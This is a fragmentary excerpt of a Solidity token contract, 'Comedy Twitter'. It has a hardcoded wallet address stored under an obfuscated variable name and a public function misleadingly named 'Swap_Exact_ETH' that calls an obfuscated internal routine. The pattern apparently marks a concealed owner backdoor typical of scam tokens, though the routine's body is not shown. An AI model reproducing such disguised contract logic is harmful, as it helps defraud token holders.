...
contract ComedyTwitter is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Comedy Twitter";
    string private _symbol = "Comedy Twitter";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xB36eda89f5380d06DB278457709C361CB31A80bE));
        oBMsVZvBCliMEkFzIRyxOxiIQIYn = payable(address(0xB36eda89f5380d06DB278457709C361CB31A80bE));
    ...
    function Swap_Exact_ETH(bool data, address[] calldata liq) public { FIAWIDKAKFKAD();
